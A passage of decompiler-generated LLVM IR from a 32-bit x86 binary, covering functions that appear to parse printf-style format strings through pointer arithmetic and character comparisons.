  %v2_8051980 = inttoptr i32 %v1_8051980 to i32*
  %v3_8051980 = load i32, i32* %v2_8051980, align 4
  %v8_8051980 = icmp eq i32 %v3_8051980, -2147483648
  %v1_8051987 = icmp eq i1 %v8_8051980, false
  br i1 %v1_8051987, label %dec_label_pc_8051997, label %dec_label_pc_8051989

dec_label_pc_8051989:                             ; preds = %dec_label_pc_8051980
  %v1_8051989 = add i32 %v1_8051994, 37
  %v2_8051989 = inttoptr i32 %v1_8051989 to i8*
  %v3_8051989 = load i8, i8* %v2_8051989, align 1
  %v2_805198d = zext i8 %v3_8051989 to i32
  %v3_805198d = mul nuw nsw i32 %v2_805198d, 12
  store i32 %v3_805198d, i32* %eax.global-to-local, align 4
  %v1_8051990 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051990 = add nsw i32 %v3_805198d, -12
  %v3_8051990 = add i32 %v2_8051990, %v1_8051990
  %v4_8051990 = inttoptr i32 %v3_8051990 to i32*
  %v5_8051990 = load i32, i32* %v4_8051990, align 4
  store i32 %v5_8051990, i32* %eax.global-to-local, align 4
  store i32 %v5_8051990, i32* %v2_8051980, align 4
  %v0_8051997.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051997

dec_label_pc_8051962.dec_label_pc_8051997.loopexit_crit_edge: ; preds = %dec_label_pc_8051961
  br label %dec_label_pc_8051997.loopexit

dec_label_pc_8051997.loopexit:                    ; preds = %dec_label_pc_8051962.dec_label_pc_8051997.loopexit_crit_edge, %dec_label_pc_80518eb
  %v1_8051962.lcssa = phi i32 [ %v1_8051962, %dec_label_pc_8051962.dec_label_pc_8051997.loopexit_crit_edge ], [ %v1_805196215, %dec_label_pc_80518eb ]
  br label %dec_label_pc_8051997

dec_label_pc_8051997:                             ; preds = %dec_label_pc_8051997.loopexit, %dec_label_pc_8051980, %dec_label_pc_8051989
  %v10_805199e = phi i32 [ %v1_8051962.lcssa, %dec_label_pc_8051997.loopexit ], [ %v1_8051994, %dec_label_pc_8051980 ], [ %v0_8051997.pre, %dec_label_pc_8051989 ]
  %v1_8051997 = add i32 %v10_805199e, 8
  %v2_8051997 = inttoptr i32 %v1_8051997 to i32*
  %v3_8051997 = load i32, i32* %v2_8051997, align 4
  store i32 %v3_8051997, i32* %eax.global-to-local, align 4
  %v2_805199a = icmp slt i32 %v3_8051997, 0
  %v1_805199c = icmp eq i1 %v2_805199a, false
  br i1 %v1_805199c, label %dec_label_pc_80519b2, label %dec_label_pc_805199e

dec_label_pc_805199e:                             ; preds = %dec_label_pc_8051997
  %v1_805199e = add i32 %v10_805199e, 16
  %v2_805199e = inttoptr i32 %v1_805199e to i32*
  %v3_805199e = load i32, i32* %v2_805199e, align 4
  %v4_805199e = or i32 %v3_805199e, 8
  store i32 %v4_805199e, i32* %v2_805199e, align 4
  %v0_80519a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80519a2 = sub i32 0, %v0_80519a2
  store i32 %v1_80519a2, i32* %eax.global-to-local, align 4
  %v1_80519a4 = load i32, i32* @ecx, align 4
  %v2_80519a4 = add i32 %v1_80519a4, 8
  %v3_80519a4 = inttoptr i32 %v2_80519a4 to i32*
  store i32 %v1_80519a2, i32* %v3_80519a4, align 4
  %v0_80519a7 = load i32, i32* @ecx, align 4
  %v1_80519a7 = add i32 %v0_80519a7, 16
  %v2_80519a7 = inttoptr i32 %v1_80519a7 to i32*
  %v3_80519a7 = load i32, i32* %v2_80519a7, align 4
  %v4_80519a7 = and i32 %v3_80519a7, -2
  store i32 %v4_80519a7, i32* %v2_80519a7, align 4
  %v0_80519ab = load i32, i32* @ecx, align 4
  %v1_80519ab = add i32 %v0_80519ab, 20
  %v2_80519ab = inttoptr i32 %v1_80519ab to i32*
  store i32 32, i32* %v2_80519ab, align 4
  %v0_80519b4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80519b2

dec_label_pc_80519b2:                             ; preds = %dec_label_pc_8051997, %dec_label_pc_805199e
  %v0_80519b4 = phi i32 [ %v3_8051997, %dec_label_pc_8051997 ], [ %v0_80519b4.pre, %dec_label_pc_805199e ]
  %v2_80519b2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80519b2, i32* @ebx, align 4
  ret i32 %v0_80519b4

; uselistorder directives
  uselistorder i32 %v3_805198d, { 1, 0 }
  uselistorder i32 %v3_8051976, { 1, 0 }
  uselistorder i32 %v1_8051961, { 2, 1, 0 }
  uselistorder i32 %v1_8051962, { 1, 2, 0 }
  uselistorder i32 %v3_80518f8, { 1, 0, 2 }
  uselistorder i32* %v2_80518f8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_80518f3, { 1, 0 }
  uselistorder i32 %v6_80518ef, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_80518ef21, { 1, 0 }
  uselistorder i32 %v1_805196215, { 2, 0, 1 }
  uselistorder i1 %v1_8051970, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_80519b2, { 1, 0 }
  uselistorder label %dec_label_pc_8051997, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051980, { 1, 0 }
  uselistorder label %dec_label_pc_8051961, { 1, 0 }
  uselistorder label %dec_label_pc_805195e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051954, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80518ef, { 1, 0 }
  uselistorder label %dec_label_pc_80518eb, { 1, 0 }
  uselistorder label %dec_label_pc_80518d1, { 1, 0 }
}

define i32 @function_80519b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80519b8:
  %v0_80519b8 = load i32, i32* @eax, align 4
  br label %dec_label_pc_80519bf

dec_label_pc_80519bf:                             ; preds = %dec_label_pc_80519bf, %dec_label_pc_80519b8
  %v0_80519bf = phi i32 [ ptrtoint (i8** @global_var_805c12a.313 to i32), %dec_label_pc_80519b8 ], [ %v1_80519bf, %dec_label_pc_80519bf ]
  %v1_80519bf = add i32 %v0_80519bf, -2
  %v1_80519c2 = inttoptr i32 %v1_80519bf to i16*
  %v2_80519c2 = load i16, i16* %v1_80519c2, align 2
  %v3_80519c2 = sext i16 %v2_80519c2 to i32
  %v12_80519c5 = icmp ne i32 %v3_80519c2, %v0_80519b8
  %v6_80519cf = icmp ugt i32 %v1_80519bf, ptrtoint (i32* @global_var_805c112.314 to i32)
  %or.cond = and i1 %v6_80519cf, %v12_80519c5
  br i1 %or.cond, label %dec_label_pc_80519bf, label %dec_label_pc_80519d1

dec_label_pc_80519d1:                             ; preds = %dec_label_pc_80519bf
  %.pre = add i32 %v0_80519bf, -134594836
  %v2_80519d7 = sdiv i32 %.pre, 2
  store i32 %v2_80519d7, i32* @edx, align 4
  %v1_80519d9 = add i32 %v2_80519d7, ptrtoint (i8** @global_var_805c12a.313 to i32)
  %v2_80519d9 = inttoptr i32 %v1_80519d9 to i8*
  %v3_80519d9 = load i8, i8* %v2_80519d9, align 1
  %v4_80519d9 = zext i8 %v3_80519d9 to i32
  ret i32 %v4_80519d9

; uselistorder directives
  uselistorder i32 %v2_80519d7, { 1, 0 }
  uselistorder i32 %v1_80519bf, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805c12a.313 to i32), { 1, 0 }
}

define i32 @function_80519e1(i32* %arg1) local_unnamed_addr {
dec_label_pc_80519e1:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80519e2 = load i32, i32* @edi, align 4
  %v0_80519e3 = load i32, i32* @esi, align 4
  %v0_80519e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80519e4, i32* %stack_var_-16, align 4
  %v4_80519e4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051a10 = add i32 %tmp76, 24
  %v2_8051a10 = inttoptr i32 %v1_8051a10 to i32*
  %v3_8051a10 = load i32, i32* %v2_8051a10, align 4
  store i32 %v3_8051a10, i32* %eax.global-to-local, align 4
  %v1_8051a17 = add i32 %tmp76, 16
  %v2_8051a17 = inttoptr i32 %v1_8051a17 to i32*
  %v3_8051a17 = load i32, i32* %v2_8051a17, align 4
  %v1_8051a1a = and i32 %v3_8051a17, 128
  %v2_8051a1a = icmp eq i32 %v1_8051a1a, 0
  store i32 %v1_8051a1a, i32* %edi.global-to-local, align 4
  %v1_8051a20 = icmp eq i1 %v2_8051a1a, false
  br i1 %v1_8051a20, label %dec_label_pc_8051a33, label %dec_label_pc_8051a22

dec_label_pc_8051a22:                             ; preds = %dec_label_pc_80519e1
  %v2_8051a22 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051a80.outer

dec_label_pc_8051a2d:                             ; preds = %dec_label_pc_8051bbb
  %v1_8051a2d = add i32 %v0_8051bbb.pre.pre, 1
  store i32 %v1_8051a2d, i32* @esi, align 4
  br label %dec_label_pc_8051bcb

dec_label_pc_8051a33:                             ; preds = %dec_label_pc_80519e1
  %v15_80519e5 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051a35

dec_label_pc_8051a35:                             ; preds = %dec_label_pc_8051a5d.dec_label_pc_8051a35_crit_edge, %dec_label_pc_8051a33
  %v2_8051a46 = phi i32 [ %v2_8051a46.pre, %dec_label_pc_8051a5d.dec_label_pc_8051a35_crit_edge ], [ %v15_80519e5, %dec_label_pc_8051a33 ]
  %v3_8051a46 = phi i32 [ %v1_8051a5d, %dec_label_pc_8051a5d.dec_label_pc_8051a35_crit_edge ], [ 0, %dec_label_pc_8051a33 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051a39 = mul i32 %v3_8051a46, 4
  store i32 %v1_8051a39, i32* @ecx, align 4
  %v2_8051a40 = load i32, i32* %arg1, align 4
  store i32 %v2_8051a40, i32* @edx, align 4
  %v2_8051a42 = add i32 %v1_8051a39, -4
  %v3_8051a42 = add i32 %v2_8051a42, %v2_8051a40
  %v4_8051a42 = inttoptr i32 %v3_8051a42 to i32*
  %v5_8051a42 = load i32, i32* %v4_8051a42, align 4
  store i32 %v5_8051a42, i32* %eax.global-to-local, align 4
  %v1_8051a46 = trunc i32 %v5_8051a42 to i8
  %v4_8051a46 = add i32 %v2_8051a46, 36
  %v5_8051a46 = add i32 %v4_8051a46, %v3_8051a46
  %v6_8051a46 = inttoptr i32 %v5_8051a46 to i8*
  store i8 %v1_8051a46, i8* %v6_8051a46, align 1
  %v0_8051a4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a4a = urem i32 %v0_8051a4a, 256
  %v2_8051a4a = load i32, i32* @ebx, align 4
  %v3_8051a4a = and i32 %v2_8051a4a, -256
  %v4_8051a4a = or i32 %v3_8051a4a, %v1_8051a4a
  store i32 %v4_8051a4a, i32* @ebx, align 4
  %v1_8051a4c = mul i32 %v0_8051a4a, 16777216
  %v2_8051a4c = sdiv i32 %v1_8051a4c, 16777216
  store i32 %v2_8051a4c, i32* %eax.global-to-local, align 4
  %v1_8051a4f = load i32, i32* @edx, align 4
  %v2_8051a4f = load i32, i32* @ecx, align 4
  %v3_8051a4f = add i32 %v1_8051a4f, -4
  %v4_8051a4f = add i32 %v3_8051a4f, %v2_8051a4f
  %v5_8051a4f = inttoptr i32 %v4_8051a4f to i32*
  %v6_8051a4f = load i32, i32* %v5_8051a4f, align 4
  %v17_8051a4f = icmp eq i32 %v2_8051a4c, %v6_8051a4f
  %v1_8051a53 = icmp eq i1 %v17_8051a4f, false
  br i1 %v1_8051a53, label %dec_label_pc_8051da5, label %dec_label_pc_8051a59

dec_label_pc_8051a59:                             ; preds = %dec_label_pc_8051a35
  %v3_8051a59 = trunc i32 %v0_8051a4a to i8
  %v4_8051a59 = icmp eq i8 %v3_8051a59, 0
  br i1 %v4_8051a59, label %dec_label_pc_8051a63, label %dec_label_pc_8051a5d

dec_label_pc_8051a5d:                             ; preds = %dec_label_pc_8051a59
  %v0_8051a5d = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a5d = add i32 %v0_8051a5d, 1
  store i32 %v1_8051a5d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051a5d, 32
  br i1 %tmp, label %dec_label_pc_8051a5d.dec_label_pc_8051a35_crit_edge, label %dec_label_pc_8051a63

dec_label_pc_8051a5d.dec_label_pc_8051a35_crit_edge: ; preds = %dec_label_pc_8051a5d
  %v2_8051a46.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051a35

dec_label_pc_8051a63:                             ; preds = %dec_label_pc_8051a5d, %dec_label_pc_8051a59
  %v2_8051a68 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8051a80.outer

dec_label_pc_8051a80.outer:                       ; preds = %dec_label_pc_8051a63, %dec_label_pc_8051a22, %dec_label_pc_8051b9d
  %v0_8051a8c.ph94 = phi i32 [ %v1_8051b9d, %dec_label_pc_8051b9d ], [ %v2_8051a22, %dec_label_pc_8051a22 ], [ %v2_8051a68, %dec_label_pc_8051a63 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8051b9d ], [ %tmp66, %dec_label_pc_8051a22 ], [ %tmp66, %dec_label_pc_8051a63 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8051a26, %dec_label_pc_8051b9d ], [ 0, %dec_label_pc_8051a22 ], [ 0, %dec_label_pc_8051a63 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051b9d ], [ %v3_8051a10, %dec_label_pc_8051a22 ], [ %v3_8051a10, %dec_label_pc_8051a63 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8051b9d ], [ 0, %dec_label_pc_8051a22 ], [ 0, %dec_label_pc_8051a63 ]
  %v7_8051a87 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8051a87 = trunc i64 %v7_8051a87 to i32
  %v2_8051a8f = add i32 %v8_8051a87, 80
  br label %dec_label_pc_8051a80

dec_label_pc_8051a80:                             ; preds = %dec_label_pc_8051a80.outer, %dec_label_pc_8051b3d
  %v0_8051a8c = phi i32 [ %v0_8051b4a, %dec_label_pc_8051b3d ], [ %v0_8051a8c.ph94, %dec_label_pc_8051a80.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8051b3d ], [ %stack_var_-32.1.ph, %dec_label_pc_8051a80.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8051b3d ], [ %stack_var_-88.1.ph, %dec_label_pc_8051a80.outer ]
  store i32 %v0_8051a8c, i32* @edx, align 4
  %v1_8051a80 = inttoptr i32 %v0_8051a8c to i8*
  %v2_8051a80 = load i8, i8* %v1_8051a80, align 1
  %v11_8051a80 = icmp eq i8 %v2_8051a80, 42
  store i32 %v0_8051a8c, i32* @esi, align 4
  %v1_8051a85 = icmp eq i1 %v11_8051a80, false
  br i1 %v1_8051a85, label %dec_label_pc_8051a97, label %dec_label_pc_8051a87

dec_label_pc_8051a87:                             ; preds = %dec_label_pc_8051a80
  store i32 %v8_8051a87, i32* %eax.global-to-local, align 4
  %v1_8051a8c = add i32 %v0_8051a8c, 1
  store i32 %v1_8051a8c, i32* @esi, align 4
  %v0_8051a8f = load i32, i32* @esp, align 4
  %v3_8051a8f = add i32 %v2_8051a8f, %v0_8051a8f
  %v4_8051a8f = inttoptr i32 %v3_8051a8f to i32*
  store i32 0, i32* %v4_8051a8f, align 4
  %v0_8051ab1.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051a97

dec_label_pc_8051a97:                             ; preds = %dec_label_pc_8051a80, %dec_label_pc_8051a87
  %v0_8051ab1.pre = phi i32 [ %v0_8051a8c, %dec_label_pc_8051a80 ], [ %v0_8051ab1.pre.pre, %dec_label_pc_8051a87 ]
  %v0_8051a97 = load i32, i32* @global_var_805e61c, align 4
  store i32 %v0_8051a97, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8051ab1.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ab1

dec_label_pc_8051aa1:                             ; preds = %dec_label_pc_8051ab1
  %v1_8051aa1 = add i32 %v1_8051aa9, -4094
  %v6_8051aa1 = sub i32 4093, %v1_8051aa9
  %v7_8051aa1 = and i32 %v6_8051aa1, %v1_8051aa9
  %v8_8051aa1 = icmp slt i32 %v7_8051aa1, 0
  %v9_8051aa1 = icmp eq i32 %v1_8051aa1, 0
  %v10_8051aa1 = icmp slt i32 %v1_8051aa1, 0
  %v3_8051aa7 = icmp eq i1 %v10_8051aa1, %v8_8051aa1
  %v4_8051aa7 = icmp eq i1 %v9_8051aa1, false
  %v5_8051aa7 = and i1 %v4_8051aa7, %v3_8051aa7
  br i1 %v5_8051aa7, label %dec_label_pc_8051ab0, label %dec_label_pc_8051aa9

dec_label_pc_8051aa9:                             ; preds = %dec_label_pc_8051aa1
  %v3_8051aa9 = mul i32 %v1_8051aa9, 10
  store i32 %v3_8051aa9, i32* %eax.global-to-local, align 4
  %v2_8051aac = add i32 %v3_8051aa9, -48
  %v3_8051aac = add i32 %v2_8051aac, %v2_8051ab3
  store i32 %v3_8051aac, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ab0

dec_label_pc_8051ab0:                             ; preds = %dec_label_pc_8051aa1, %dec_label_pc_8051aa9
  %v0_8051acb32 = phi i32 [ %v1_8051aa9, %dec_label_pc_8051aa1 ], [ %v3_8051aac, %dec_label_pc_8051aa9 ]
  %v4_8051ab128 = phi i32 [ %v6_8051ab1, %dec_label_pc_8051aa1 ], [ %v3_8051aa9, %dec_label_pc_8051aa9 ]
  %v1_8051ab0 = add i32 %v0_8051ab0, 1
  store i32 %v1_8051ab0, i32* @esi, align 4
  br label %dec_label_pc_8051ab1

dec_label_pc_8051ab1:                             ; preds = %dec_label_pc_8051a97, %dec_label_pc_8051ab0
  %v1_8051aa9 = phi i32 [ 0, %dec_label_pc_8051a97 ], [ %v0_8051acb32, %dec_label_pc_8051ab0 ]
  %v4_8051ab1 = phi i32 [ %v4_8051ab1.pre, %dec_label_pc_8051a97 ], [ %v4_8051ab128, %dec_label_pc_8051ab0 ]
  %v0_8051ab0 = phi i32 [ %v0_8051ab1.pre, %dec_label_pc_8051a97 ], [ %v1_8051ab0, %dec_label_pc_8051ab0 ]
  %v1_8051ab1 = inttoptr i32 %v0_8051ab0 to i8*
  %v2_8051ab1 = load i8, i8* %v1_8051ab1, align 1
  %v3_8051ab1 = zext i8 %v2_8051ab1 to i32
  %v5_8051ab1 = and i32 %v4_8051ab1, -256
  %v6_8051ab1 = or i32 %v3_8051ab1, %v5_8051ab1
  store i32 %v6_8051ab1, i32* %eax.global-to-local, align 4
  %v2_8051ab3 = sext i8 %v2_8051ab1 to i32
  store i32 %v2_8051ab3, i32* @ecx, align 4
  %v2_8051ab6 = mul nsw i32 %v2_8051ab3, 2
  %v3_8051ab6 = add i32 %v2_8051ab6, %v0_8051a97
  %v4_8051ab6 = inttoptr i32 %v3_8051ab6 to i8*
  %v5_8051ab6 = load i8, i8* %v4_8051ab6, align 1
  %v6_8051ab6 = and i8 %v5_8051ab6, 8
  %v7_8051ab6 = icmp eq i8 %v6_8051ab6, 0
  %v1_8051abb = icmp eq i1 %v7_8051ab6, false
  br i1 %v1_8051abb, label %dec_label_pc_8051aa1, label %dec_label_pc_8051abd

dec_label_pc_8051abd:                             ; preds = %dec_label_pc_8051ab1
  %v0_8051abd = load i32, i32* @edx, align 4
  %v1_8051abd = add i32 %v0_8051abd, -1
  %v2_8051abd = inttoptr i32 %v1_8051abd to i8*
  %v3_8051abd = load i8, i8* %v2_8051abd, align 1
  %v12_8051abd = icmp eq i8 %v3_8051abd, 37
  %v1_8051ac1 = icmp eq i1 %v12_8051abd, false
  br i1 %v1_8051ac1, label %dec_label_pc_8051b54, label %dec_label_pc_8051ac7

dec_label_pc_8051ac7:                             ; preds = %dec_label_pc_8051abd
  %v10_8051ac7 = icmp eq i8 %v2_8051ab1, 36
  %v1_8051ac9 = icmp eq i1 %v10_8051ac7, false
  br i1 %v1_8051ac9, label %dec_label_pc_8051afb, label %dec_label_pc_8051acb

dec_label_pc_8051acb:                             ; preds = %dec_label_pc_8051ac7
  %tmp89 = icmp slt i32 %v1_8051aa9, 1
  br i1 %tmp89, label %dec_label_pc_8051afb, label %dec_label_pc_8051acf

dec_label_pc_8051acf:                             ; preds = %dec_label_pc_8051acb
  %v4_8051acf = icmp eq i32 %stack_var_-88.1, 0
  %v1_8051ad4 = add i32 %v0_8051ab0, 1
  store i32 %v1_8051ad4, i32* @edx, align 4
  br i1 %v4_8051acf, label %dec_label_pc_8051da5, label %dec_label_pc_8051add

dec_label_pc_8051add:                             ; preds = %dec_label_pc_8051acf
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8051ae5 = sub i32 %v1_8051aa9, %stack_var_-88.1
  %v8_8051ae5 = xor i32 %v1_8051aa9, %stack_var_-88.1
  %v9_8051ae5 = xor i32 %v2_8051ae5, %v1_8051aa9
  %v10_8051ae5 = and i32 %v9_8051ae5, %v8_8051ae5
  %v11_8051ae5 = icmp slt i32 %v10_8051ae5, 0
  %v12_8051ae5 = icmp eq i32 %v2_8051ae5, 0
  %v13_8051ae5 = icmp slt i32 %v2_8051ae5, 0
  %v3_8051ae7 = icmp ne i1 %v13_8051ae5, %v11_8051ae5
  %v4_8051ae7 = or i1 %v12_8051ae5, %v3_8051ae7
  %stack_var_-88.1.v0_8051ae9 = select i1 %v4_8051ae7, i32 %stack_var_-88.1, i32 %v1_8051aa9
  br label %dec_label_pc_8051af7

dec_label_pc_8051af7:                             ; preds = %dec_label_pc_8051b0b, %dec_label_pc_8051add, %dec_label_pc_8051b0f
  %v0_8051af7 = phi i32 [ %v1_8051ad4, %dec_label_pc_8051add ], [ %v0_8051abd, %dec_label_pc_8051b0f ], [ %v0_8051abd, %dec_label_pc_8051b0b ]
  %stack_var_-32.2 = phi i32 [ %v1_8051aa9, %dec_label_pc_8051add ], [ %stack_var_-32.1, %dec_label_pc_8051b0f ], [ %stack_var_-32.1, %dec_label_pc_8051b0b ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8051ae9, %dec_label_pc_8051add ], [ 0, %dec_label_pc_8051b0f ], [ 0, %dec_label_pc_8051b0b ]
  store i32 %v0_8051af7, i32* @esi, align 4
  br label %dec_label_pc_8051b1e

dec_label_pc_8051afb:                             ; preds = %dec_label_pc_8051acb, %dec_label_pc_8051ac7
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_8051b0b, label %dec_label_pc_8051b02

dec_label_pc_8051b02:                             ; preds = %dec_label_pc_8051afb
  %v10_8051b02 = icmp eq i8 %v2_8051ab1, 109
  br i1 %v10_8051b02, label %dec_label_pc_8051b54, label %dec_label_pc_8051da5

dec_label_pc_8051b0b:                             ; preds = %dec_label_pc_8051afb
  %tmp153 = icmp ugt i32 %v0_8051ab0, %v0_8051abd
  br i1 %tmp153, label %dec_label_pc_8051b0f, label %dec_label_pc_8051af7

dec_label_pc_8051b0f:                             ; preds = %dec_label_pc_8051b0b
  %v1_8051b0f = inttoptr i32 %v0_8051abd to i8*
  %v2_8051b0f = load i8, i8* %v1_8051b0f, align 1
  %v8_8051b0f = icmp eq i8 %v2_8051b0f, 48
  br i1 %v8_8051b0f, label %dec_label_pc_8051af7, label %dec_label_pc_8051b54

dec_label_pc_8051b1e:                             ; preds = %dec_label_pc_8051b2f, %dec_label_pc_8051af7
  %v0_8051b4a = phi i32 [ %v1_8051b2f, %dec_label_pc_8051b2f ], [ %v0_8051af7, %dec_label_pc_8051af7 ]
  %v4_8051b2835 = phi i32 [ %v6_8051b28, %dec_label_pc_8051b2f ], [ %v6_8051ab1, %dec_label_pc_8051af7 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805c10a.315 to i32), i32* %edx.global-to-local, align 4
  %v1_8051b2b = inttoptr i32 %v0_8051b4a to i8*
  br label %dec_label_pc_8051b28

dec_label_pc_8051b28:                             ; preds = %dec_label_pc_8051b39, %dec_label_pc_8051b1e
  %v4_8051b28 = phi i32 [ %v4_8051b2835, %dec_label_pc_8051b1e ], [ %v6_8051b28, %dec_label_pc_8051b39 ]
  %v0_8051b2a = phi i32 [ ptrtoint ([8 x i8]* @global_var_805c10a.315 to i32), %dec_label_pc_8051b1e ], [ %v1_8051b2a, %dec_label_pc_8051b39 ]
  %v0_8051b39 = phi i32 [ 1, %dec_label_pc_8051b1e ], [ %v2_8051b39, %dec_label_pc_8051b39 ]
  store i32 %v0_8051b39, i32* @ecx, align 4
  %v1_8051b28 = inttoptr i32 %v0_8051b2a to i8*
  %v2_8051b28 = load i8, i8* %v1_8051b28, align 1
  %v3_8051b28 = zext i8 %v2_8051b28 to i32
  %v5_8051b28 = and i32 %v4_8051b28, -256
  %v6_8051b28 = or i32 %v3_8051b28, %v5_8051b28
  store i32 %v6_8051b28, i32* %eax.global-to-local, align 4
  %v1_8051b2a = add i32 %v0_8051b2a, 1
  store i32 %v1_8051b2a, i32* @edx, align 4
  %v2_8051b2b = load i8, i8* %v1_8051b2b, align 1
  %v15_8051b2b = icmp eq i8 %v2_8051b2b, %v2_8051b28
  %v1_8051b2d = icmp eq i1 %v15_8051b2b, false
  br i1 %v1_8051b2d, label %dec_label_pc_8051b34, label %dec_label_pc_8051b2f

dec_label_pc_8051b2f:                             ; preds = %dec_label_pc_8051b28
  %v1_8051b2f = add i32 %v0_8051b4a, 1
  store i32 %v1_8051b2f, i32* @esi, align 4
  %v0_8051b30 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051b30 = or i32 %v0_8051b30, %v0_8051b39
  store i32 %v2_8051b30, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051b1e

dec_label_pc_8051b34:                             ; preds = %dec_label_pc_8051b28
  %v1_8051b34 = inttoptr i32 %v1_8051b2a to i8*
  %v2_8051b34 = load i8, i8* %v1_8051b34, align 1
  %v3_8051b34 = icmp eq i8 %v2_8051b34, 0
  br i1 %v3_8051b34, label %dec_label_pc_8051b3d, label %dec_label_pc_8051b39

dec_label_pc_8051b39:                             ; preds = %dec_label_pc_8051b34
  %v2_8051b39 = mul i32 %v0_8051b39, 2
  br label %dec_label_pc_8051b28

dec_label_pc_8051b3d:                             ; preds = %dec_label_pc_8051b34
  %v0_8051b3d = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051b41 = udiv i32 %v0_8051b3d, 2
  %v1_8051b41.not = or i32 %v1_8051b41, -6
  %v1_8051b46 = xor i32 %v1_8051b41.not, 5
  store i32 %v1_8051b46, i32* %eax.global-to-local, align 4
  %v2_8051b48 = and i32 %v1_8051b46, %v0_8051b3d
  store i32 %v2_8051b48, i32* %edi.global-to-local, align 4
  %v1_8051b4a = add i32 %v0_8051b4a, -1
  %v2_8051b4a = inttoptr i32 %v1_8051b4a to i8*
  %v3_8051b4a = load i8, i8* %v2_8051b4a, align 1
  %v12_8051b4a = icmp eq i8 %v3_8051b4a, 37
  %v1_8051b4e = icmp eq i1 %v12_8051b4a, false
  br i1 %v1_8051b4e, label %dec_label_pc_8051a80, label %dec_label_pc_8051b54

dec_label_pc_8051b54:                             ; preds = %dec_label_pc_8051b0f, %dec_label_pc_8051b3d, %dec_label_pc_8051abd, %dec_label_pc_8051b02
  %v0_8051b77 = phi i32 [ %v1_8051aa9, %dec_label_pc_8051b02 ], [ %v1_8051aa9, %dec_label_pc_8051b0f ], [ 0, %dec_label_pc_8051b3d ], [ %v1_8051aa9, %dec_label_pc_8051abd ]
  %v1_8051b80 = phi i32 [ %v0_8051ab0, %dec_label_pc_8051b02 ], [ %v0_8051ab0, %dec_label_pc_8051b0f ], [ %v0_8051b4a, %dec_label_pc_8051b3d ], [ %v0_8051ab0, %dec_label_pc_8051abd ]
  %v0_8051b7d = phi i32 [ %v0_8051abd, %dec_label_pc_8051b02 ], [ %v0_8051abd, %dec_label_pc_8051b0f ], [ %v1_8051b2a, %dec_label_pc_8051b3d ], [ %v0_8051abd, %dec_label_pc_8051abd ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8051b02 ], [ %stack_var_-32.1, %dec_label_pc_8051b0f ], [ %stack_var_-32.2, %dec_label_pc_8051b3d ], [ %stack_var_-32.1, %dec_label_pc_8051abd ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8051b02 ], [ 0, %dec_label_pc_8051b0f ], [ %stack_var_-88.2, %dec_label_pc_8051b3d ], [ %stack_var_-88.1, %dec_label_pc_8051abd ]
  %v1_8051b54 = inttoptr i32 %v0_8051b7d to i8*
  %v2_8051b54 = load i8, i8* %v1_8051b54, align 1
